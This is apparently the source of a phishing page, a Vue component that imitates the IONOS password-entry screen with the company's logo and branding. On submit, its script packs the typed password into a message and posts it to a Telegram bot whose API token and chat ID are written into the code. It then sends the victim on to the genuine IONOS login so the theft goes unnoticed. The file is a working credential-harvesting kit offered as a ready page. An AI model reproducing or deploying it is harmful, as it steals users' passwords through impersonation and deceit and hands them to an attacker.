<template>
  <div class="page">
    <!-- Top navigation -->
    <header class="topbar">
      <div class="brand-area">
        <!-- <div class="brand" aria-label="IONOS">IONOS</div> -->

        <a href="https://www.ionos.com/">
          <img
            width="95px"
            src="https://www.ionos.com/newsroom/wp-content/uploads/sites/3/2022/02/LOGO_IONOS_Blue_RGB.png"
            alt=""
          />
        </a>
        <div class="product-login">PRODUCT LOGIN</div>
      </div>

      <div class="search-box">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="1em"
          height="1em"
          viewBox="0 0 1024 1024"
        >
          <path d="M0 0h1024v1024H0z" fill="none" />
          <path
            fill="currentColor"
            d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1S492.1 112 412 112s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0 0 11.6 0l43.6-43.5a8.2 8.2 0 0 0 0-11.6M570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4"
          />
        </svg>

        <input
          type="text"
          placeholder="Search for features, domains, and help"
          aria-label="Search"
        />

        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="1em"
          height="1em"
          viewBox="0 0 16 16"
        >
          <path d="M0 0h16v16H0z" fill="none" />
          <g fill="currentColor">
            <path d="M5 3a3 3 0 0 1 6 0v5a3 3 0 0 1-6 0z" />
            <path
              d="M3.5 6.5A.5.5 0 0 1 4 7v1a4 4 0 0 0 8 0V7a.5.5 0 0 1 1 0v1a5 5 0 0 1-4.5 4.975V15h3a.5.5 0 0 1 0 1h-7a.5.5 0 0 1 0-1h3v-2.025A5 5 0 0 1 3 8V7a.5.5 0 0 1 .5-.5"
            />
          </g>
        </svg>
      </div>

      <button class="help-button" aria-label="Help">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path
            d="M12 4.2c-4.2 0-7.7 2.8-7.7 6.8 0 2.2 1.1 4.1 3 5.3l-.7 3.2 3.1-1.8c.7.2 1.5.3 2.3.3 4.2 0 7.7-2.8 7.7-6.9S16.2 4.2 12 4.2z"
          ></path>
          <path d="M9.8 9.1a2.3 2.3 0 1 1 3.9 1.6c-.9.8-1.7 1.1-1.7 2.2"></path>
          <circle
            cx="12"
            cy="15.7"
            r=".7"
            fill="currentColor"
            stroke="none"
          ></circle>
        </svg>
      </button>
    </header>

    <main class="content">
      <!-- Information banner -->

      <!-- Login card -->
      <section class="login-card" style="margin-top: 0; max-width: 650px">
        <div class="login-heading">
          <div class="login-icon" aria-hidden="true">
            <!-- <span class="arrow-box"></span>
            <span class="arrow"></span> -->
            <img src="https://id.ionos.com/image/password.svg" alt="" />
          </div>
          <h1>Enter password</h1>
        </div>

        <div
          class="hovv"
          style="color: #1474c4; display: flex; align-items: center"
        >
          <a
            href="./login"
            style="padding: 8px 11px; border-radius: 50px; font-size: 14px"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="1em"
              height="1em"
              viewBox="0 0 24 24"
            >
              <path d="M0 0h24v24H0z" fill="none" />
              <path
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="m15 4l-8 8l8 8"
              />
            </svg>
          </a>

          <span
            style="
              display: flex;
              align-items: center;
              padding: 2px 20px;
              gap: 10px;
              border-radius: 20px;
              height: 36px;
            "
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="1em"
              height="1em"
              viewBox="0 0 32 32"
            >
              <path d="M0 0h32v32H0z" fill="none" />
              <path
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M22 11c0 5-3 9-6 9s-6-4-6-9s2-8 6-8s6 3 6 8M4 30h24c0-9-6-10-12-10S4 21 4 30"
              />
            </svg>

            <p style="margin: 0">{{ formDataRes.email }}</p>
          </span>
        </div>

        <form @submit.prevent="finishJoob" novalidate>
          <label for="password">Password</label>

          <div class="password-input-wrapper">
            <input
              id="password"
              v-model="formDataRes.password"
              class="email-input"
              :type="showPassword ? 'text' : 'password'"
              autocomplete="current-password"
              spellcheck="false"
            />

            <button
              type="button"
              class="password-toggle"
              @click="showPassword = !showPassword"
              :aria-label="showPassword ? 'Hide password' : 'Show password'"
            >
              <!-- Eye open -->
              <svg v-if="!showPassword" viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6z"
                />
                <circle cx="12" cy="12" r="2.5" />
              </svg>

              <!-- Eye closed -->
              <svg v-else viewBox="0 0 24 24" aria-hidden="true">
                <path d="M3 3l18 18" />
                <path
                  d="M10.6 6.2A10.7 10.7 0 0 1 12 6c6 0 9.5 6 9.5 6a17.5 17.5 0 0 1-3.3 3.8"
                />
                <path
                  d="M6.2 6.2C3.8 7.7 2.5 12 2.5 12s3.5 6 9.5 6c1.5 0 2.8-.3 4-.8"
                />
                <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" />
              </svg>
            </button>
          </div>

          <p v-if="submitted && !isValidEmail" class="error-message">
            Please enter a valid password.
          </p>

          <p style="margin-top: 6px; margin-bottom: 6px">
            <a
              href="https://www.ionos.com/help/index.php?id=2327"
              style="color: #1474c4; font-size: 14px; padding-top: 6px"
              >Forgot Your Password?</a
            >
          </p>
          <p class="device-note">
            <strong>Not your device?</strong>
            Log out after the session or use
            <a href="#" @click.prevent>private browsing mode</a>.
          </p>

          <button class="next-button" type="submit">Next</button>
        </form>
      </section>
    </main>

    <!-- Footer -->
    <footer class="footer">
      <div class="system-status">
        <span class="status-dot"></span>
        <span>All Systems Operational</span>
      </div>

      <div class="copyright">© 2026 IONOS Inc.</div>

      <div class="footer-links">
        <a href="#" @click.prevent>Privacy Policy</a>
        <span>-</span>
        <a href="#" @click.prevent>T&amp;Cs</a>
      </div>
    </footer>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        email: "",
        password: "",
      },
      showPassword: false,
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },

  computed: {
    isFormValid() {
      return this.formDataRes.password.trim() !== "";
    },
  },

  mounted() {
    const savedEmail = localStorage.getItem("userEmail");

    if (savedEmail) {
      this.formDataRes.email = savedEmail;
    }
  },

  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*🥏🥏🥏IIONOS🥏🥏🥏 *\nPASSWORD: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message,
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://id.ionos.com/identifier");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<style>
.password-input-wrapper {
  position: relative;
  width: 100%;
}

.password-input-wrapper .email-input {
  width: 100%;
  padding-right: 48px;
}

.password-toggle {
  position: absolute;
  top: 50%;
  right: 12px;
  transform: translateY(-50%);

  width: 30px;
  height: 30px;

  padding: 4px;
  border: 0;
  background: transparent;

  display: flex;
  align-items: center;
  justify-content: center;

  color: #071e49;
  cursor: pointer;
}

.password-toggle svg {
  width: 21px;
  height: 21px;

  fill: none;
  stroke: currentColor;
  stroke-width: 1.7;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.password-toggle:hover {
  color: #0068d9;
}

/* ====================================================== */
.hovv a:hover {
  background-color: var(--default-background-color, #95caeb6c);
}

.hovv {
  padding: 20px 0px;
}

.hovv span:hover {
  background-color: var(--default-background-color, #95caeb6c);
}

* {
  box-sizing: border-box;
}

html,
body,
#__nuxt {
  margin: 0;
  min-height: 100%;
}

body {
  font-family: Arial, Helvetica, sans-serif;
  color: #071e49;
  background: #f4f7fa;
  font-size: 16px;
}

button,
input {
  font: inherit;
}

a {
  color: #0068d9;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

.page {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

/* ---------------- Header ---------------- */

.topbar {
  height: 74px;
  width: 100%;
  background: #fff;
  display: grid;
  grid-template-columns: 1fr minmax(360px, 500px) 1fr;
  align-items: center;
  padding: 0 28px;
  border-bottom: 1px solid #d5dce5;
  box-shadow: 0 2px 8px rgba(0, 32, 80, 0.14);
  z-index: 2;
  position: sticky;
  top: 0;
}

.brand-area {
  display: flex;
  align-items: center;
  gap: 22px;
}

.brand {
  color: #073b91;
  font-size: 24px;
  font-weight: 700;
  letter-spacing: 4px;
  line-height: 1;
}

.product-login {
  color: #003d8f;
  font-size: 22px;
  font-weight: 500;
}

.search-box {
  height: 52px;
  border: 1px solid #7f91ad;
  border-radius: 10px;
  display: flex;
  align-items: center;
  padding: 0 12px;
  background: #fff;
}

.search-box:hover {
  border: 2px solid #1474c4;
}

.search-box svg {
  width: 20px;
  height: 20px;
  flex: 0 0 auto;
  fill: none;
  color: #465a75;
  /* stroke: #071e49; */
  /* stroke-width: 1.7; */
}

.search-box input {
  flex: 1;
  min-width: 0;
  border: 0;
  outline: 0;
  padding: 0 11px;
  color: #071e49;
  background: transparent;
  font-size: 16px;
}

.search-box input::placeholder {
  color: #5d6e89;
  opacity: 1;
}

.search-box .mic {
  width: 22px;
  height: 22px;
}

.help-button {
  justify-self: end;
  width: 44px;
  height: 44px;
  border: 0;
  background: transparent;
  color: #071e49;
  cursor: pointer;
  padding: 7px;
}

.help-button svg {
  width: 100%;
  height: 100%;
  fill: none;
  stroke: currentColor;
  stroke-width: 1.9;
}

/* ---------------- Main ---------------- */

.content {
  width: min(744px, calc(100% - 32px));
  margin: 0 auto;
  padding: 0 0 95px;
  padding-top: 32px;
  flex: 1;
}

.notice-card,
.login-card {
  background: #fff;
  border-radius: 19px;
}

.notice-card {
  padding: 28px 34px 29px;
  margin-top: 0;
  min-height: 190px;
}

.notice-title {
  display: flex;
  align-items: center;
  gap: 12px;
  color: #006279;
  font-size: 17px;
  margin-bottom: 22px;
}

.info-icon {
  width: 26px;
  height: 26px;
  border-radius: 50%;
  background: #00687c;
  color: #fff;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  font-family: Georgia, serif;
  font-weight: 700;
  font-size: 18px;
  flex: 0 0 auto;
}

.notice-card p {
  margin: 0 0 16px;
  line-height: 1.45;
  font-size: 15px;
}

.notice-card a {
  font-size: 15px;
}

/* ---------------- Login card ---------------- */

.login-card {
  padding: 42px 34px 47px;
  min-height: fit-content;
}

.login-heading {
  display: flex;
  align-items: center;
  gap: 23px;
  margin-bottom: 0px;
}

.login-heading h1 {
  margin: 0;
  font-size: 22px;
  font-weight: 600;
  color: #071e49;
}

.login-icon {
  width: 57px;
  height: 57px;
  position: relative;
  flex: 0 0 auto;
}

.arrow-box {
  position: absolute;
  width: 43px;
  height: 43px;
  top: 2px;
  left: 13px;
  background: #8ed0ef;
}

.arrow {
  position: absolute;
  left: 3px;
  top: 15px;
  width: 34px;
  height: 25px;
  background: #0b2a63;
  clip-path: polygon(0 25%, 48% 25%, 48% 0, 100% 50%, 48% 100%, 48% 75%, 0 75%);
}

.login-card form label {
  display: block;
  font-size: 15px;
  font-weight: 700;
  margin-bottom: 7px;
}

.email-input {
  width: 100%;
  height: 42px;
  border: 1px solid #7085a4;
  border-radius: 9px;
  padding: 0 13px;
  outline: none;
  color: #071e49;
  background: #fff;
  font-size: 15px;
}

.email-input:focus {
  border-color: #0068d9;
  box-shadow: 0 0 0 2px rgba(0, 104, 217, 0.12);
}

.email-input.invalid {
  border-color: #c43b3b;
}

.error-message {
  color: #b42318;
  font-size: 14px;
  margin: 7px 0 0;
}

.device-note {
  margin: 6px 0 28px;
  font-size: 14px;
  line-height: 1.4;
}

.device-note a {
  text-decoration: underline;
  color: #071e49;
}

.device-note a:hover {
  background-color: #95caeb6c;
}

.next-button {
  width: 100%;
  height: 42px;
  border: 0;
  border-radius: 22px;
  background: #0b2a63;
  color: #fff;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  transition:
    background 0.15s ease,
    transform 0.15s ease;
}

.next-button:hover {
  background: #1474c4;
}

.next-button:active {
  transform: translateY(1px);
}

.professional-email {
  margin-top: 70px;
  font-size: 14px;
  line-height: 1.5;
}

.professional-email strong {
  display: block;
  margin-bottom: 6px;
}

/* ---------------- Quick access ---------------- */

.quick-section {
  margin-top: 39px;
}

.quick-section h2 {
  margin: 0 0 15px;
  font-size: 17px;
  font-weight: 700;
}

.quick-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 34px;
}

.quick-card {
  min-height: 145px;
  background: #fff;
  border-radius: 17px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  gap: 7px;
  color: #1474c4;
  font-weight: 700;
  font-size: 16px;
}

.quick-card:hover {
  text-decoration: none;
  box-shadow: 0 3px 12px rgba(0, 32, 80, 0.08);
}

.quick-icon {
  width: 64px;
  height: 64px;
}

.quick-icon svg {
  width: 100%;
  height: 100%;
  fill: #8ed0ef;
  stroke: #1474c4;
  stroke-width: 3;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.account-icon svg circle:first-child {
  fill: #8ed0ef;
  stroke: none;
}

.account-icon svg circle:nth-child(2),
.account-icon svg path {
  fill: #1474c4;
  stroke: none;
}

/* ---------------- Footer ---------------- */

.footer {
  min-height: 72px;
  border-top: 1px solid #b8c2cf;
  background: #fff;
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  align-items: center;
  padding: 0 35px;
  font-size: 14px;
  color: #071e49;
}

.system-status {
  display: flex;
  align-items: center;
  gap: 7px;
}

.status-dot {
  width: 14px;
  height: 14px;
  border-radius: 50%;
  background: #18c879;
}

.copyright {
  text-align: center;
}

.footer-links {
  justify-self: end;
  display: flex;
  align-items: center;
  gap: 5px;
}

.footer-links a {
  color: #071e49;
}

/* ---------------- Responsive ---------------- */

@media (max-width: 900px) {
  .topbar {
    grid-template-columns: 1fr auto;
    height: auto;
    min-height: 74px;
    padding: 12px 20px;
    gap: 12px;
  }

  .search-box {
    grid-column: 1 / -1;
    grid-row: 2;
    width: 100%;
    margin-bottom: 2px;
  }

  .help-button {
    grid-column: 2;
    grid-row: 1;
  }

  .brand-area {
    grid-column: 1;
    grid-row: 1;
  }

  .product-login {
    font-size: 19px;
  }

  .brand {
    font-size: 22px;
  }
}

@media (max-width: 640px) {
  body {
    font-size: 15px;
  }

  .content {
    width: 100%;
    padding: 0 14px 55px;
  }

  .notice-card,
  .login-card {
    border-radius: 14px;
  }

  .notice-card {
    padding: 22px 20px;
  }

  .login-card {
    margin-top: 20px;
    padding: 28px 20px 34px;
  }

  .login-heading {
    margin-bottom: 36px;
    gap: 16px;
  }

  .login-heading h1 {
    font-size: 19px;
  }

  .professional-email {
    margin-top: 45px;
  }

  .quick-grid {
    grid-template-columns: 1fr;
    gap: 12px;
  }

  .quick-card {
    min-height: 105px;
  }

  .footer {
    grid-template-columns: 1fr;
    gap: 14px;
    padding: 18px 20px;
    text-align: center;
  }

  .system-status,
  .footer-links {
    justify-self: center;
  }

  .copyright {
    order: 2;
  }

  .footer-links {
    order: 3;
  }
}

@media (max-width: 430px) {
  .brand-area {
    gap: 11px;
  }

  .brand {
    font-size: 19px;
    letter-spacing: 3px;
  }

  .product-login {
    font-size: 16px;
  }

  .notice-title {
    align-items: flex-start;
  }
}
</style>
